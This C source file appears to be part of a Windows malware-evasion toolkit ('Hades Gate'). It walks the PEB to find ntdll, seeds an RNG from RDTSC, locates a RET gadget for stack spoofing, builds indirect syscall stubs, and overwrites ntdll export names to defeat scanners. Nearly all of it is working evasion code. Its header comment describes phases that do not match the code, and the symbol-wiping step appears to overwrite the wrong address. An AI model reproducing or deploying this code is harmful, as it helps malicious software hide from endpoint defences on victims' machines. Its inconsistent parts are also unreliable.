#include "hades_gate.h"
#include "indirect_syscall.h"
#include <winternl.h>
#include <intrin.h>
#include <stdio.h>

//
// Initialization sequence for the complete syscall infrastructure:
//
//   Phase 1: PEB walk -> find ntdll base (no disk reads, no GetModuleHandle)
//   Phase 2: Resolve all 64+ SSNs via Hades Gate export parsing
//   Phase 3: Build indirect syscall stubs with stack-spoofing RET gadgets
//   Phase 4: Randomize per-stub junk bytes (LCG seeded from RDTSC)
//   Phase 5: Flip all stub pages W^X (RW during construction -> RX after)
//   Phase 6: Destroy symbol names in ntdll exports (zero out .rdata strings)
//

static ULONG g_SyscallInitPhase = 0;
static PVOID g_NtdllBase = NULL;
static PVOID g_RetGadget = NULL;
static ULONG g_Seed = 0;

//
// Phase 1: Locate ntdll base via PEB walk
//
BOOL InitPhase1_FindNtdll(void)
{
    g_NtdllBase = HadesGetNtdllBase();
    if (!g_NtdllBase)
        return FALSE;

    g_SyscallInitPhase = 1;
    return TRUE;
}

//
// Phase 2: Seed the LCG from hardware RDTSC
//
void InitPhase2_SeedRng(void)
{
    g_Seed = (ULONG)__rdtsc();

    //
    // Stir with a few iterations
    //
    LCGNext(&g_Seed);
    LCGNext(&g_Seed);
    LCGNext(&g_Seed);

    g_SyscallInitPhase = 2;
}

//
// Phase 3: Find a RET gadget in ntdll for stack spoofing
//
BOOL InitPhase3_FindRetGadget(void)
{
    if (!g_NtdllBase)
        return FALSE;

    g_RetGadget = FindRetGadgetInNtdll(g_NtdllBase);
    if (!g_RetGadget)
    {
        //
        // Fallback: scan the first 64KB of .text more aggressively
        //
        HADES_NTDLL_INFO Info;
        if (!HadesGetNtdllInfo(&Info))
            return FALSE;

        for (ULONG offset = 0; offset < Info.TextSize && offset < 0x10000; offset++)
        {
            if (((PBYTE)Info.TextStart)[offset] == 0xC3)
            {
                g_RetGadget = (PBYTE)Info.TextStart + offset;
                break;
            }
        }

        if (!g_RetGadget)
            return FALSE;
    }

    g_SyscallInitPhase = 3;
    return TRUE;
}

//
// Phase 4: Build all stubs via BuildAllStubs() from stealth_stubs.c
//
extern ULONG BuildAllStubs(void);
extern PSYSCALL_REGISTRY GetStubRegistry(void);
extern BOOL AreStubsInitialized(void);

BOOL InitPhase4_BuildAllStubs(void)
{
    ULONG built;

    built = BuildAllStubs();
    if (built == 0)
        return FALSE;

    g_SyscallInitPhase = 4;
    return TRUE;
}

//
// Phase 5: Destroy symbol name strings in ntdll's .rdata section
// to make it harder for scanners to cross-reference function names
// with stub addresses.
//
// We iterate the export table and zero out the name strings for
// all NT functions we've stubbed.
//
BOOL InitPhase5_DestroySymbolNames(void)
{
    PSYSCALL_REGISTRY Reg;
    ULONG i;

    Reg = GetStubRegistry();
    if (!Reg)
        return FALSE;

    if (!g_NtdllBase)
        return FALSE;

    for (i = 0; i < SYSCALL_HASH_SIZE; i++)
    {
        PSYSCALL_STUB_ENTRY Entry = Reg->Buckets[i];
        while (Entry)
        {
            PVOID ExportNameAddr;
            ULONG OldProtect;

           //
            // Get the address of the name string in ntdll's export table
            //
            ExportNameAddr = HadesGetProcR(g_NtdllBase, Entry->FunctionName);
            if (ExportNameAddr)
            {
                //
                // Temporarily make the page writable
                //
                PVOID PageBase = (PVOID)((ULONG_PTR)ExportNameAddr & ~(ULONG_PTR)0xFFF);
                SIZE_T PageSize = 0x1000;

                if (VirtualProtect(PageBase, PageSize, PAGE_READWRITE, &OldProtect))
                {
                    //
                    // Zero out the function name string in ntdll
                    //
                    SIZE_T NameLen = strlen(Entry->FunctionName) + 1;
                    ZeroMemory(ExportNameAddr, NameLen);

                    //
                    // Optionally overwrite with random bytes
                    //
                    for (SIZE_T j = 0; j < NameLen; j++)
                    {
                        g_Seed = LCGNext(&g_Seed);
                        ((PBYTE)ExportNameAddr)[j] = (BYTE)(g_Seed & 0xFF);
                    }

                    //
                    // Restore original protection
                    //
                    VirtualProtect(PageBase, PageSize, OldProtect, &OldProtect);
                }
            }
            Entry = Entry->Next;
        }
    }

    g_SyscallInitPhase = 5;
    return TRUE;
}

//
// Full initialization: runs all 5 phases sequentially
//
BOOL SyscallInitFull(void)
{
    if (!InitPhase1_FindNtdll())
    {
        printf("[!] Phase 1 FAILED: ntdll base not found\n");
        return FALSE;
    }
    printf("[+] Phase 1: ntdll base = %p\n", g_NtdllBase);

    InitPhase2_SeedRng();
    printf("[+] Phase 2: RNG seeded (0x%08lX)\n", g_Seed);

    if (!InitPhase3_FindRetGadget())
    {
        printf("[!] Phase 3 FAILED: no RET gadget found in ntdll\n");
        return FALSE;
    }
    printf("[+] Phase 3: RET gadget = %p\n", g_RetGadget);

    if (!InitPhase4_BuildAllStubs())
    {
        printf("[!] Phase 4 FAILED: no stubs built\n");
        return FALSE;
    }
    {
        PSYSCALL_REGISTRY reg = GetStubRegistry();
        printf("[+] Phase 4: %lu stubs built\n", reg ? reg->Count : 0);
    }

    if (!InitPhase5_DestroySymbolNames())
    {
        //
        // Non-fatal: symbol destruction is an enhancement, not a requirement
        //
        printf("[~] Phase 5: symbol destruction skipped or incomplete\n");
    }
    else
    {
        printf("[+] Phase 5: export symbol names destroyed in ntdll\n");
    }

    g_SyscallInitPhase = 6;
    printf("[+] Syscall infrastructure fully initialized.\n");
    return TRUE;
}

//
// Get current initialization phase
//
ULONG GetSyscallInitPhase(void)
{
    return g_SyscallInitPhase;
}

//
// Get currently used RET gadget
//
PVOID GetRetGadget(void)
{
    return g_RetGadget;
}
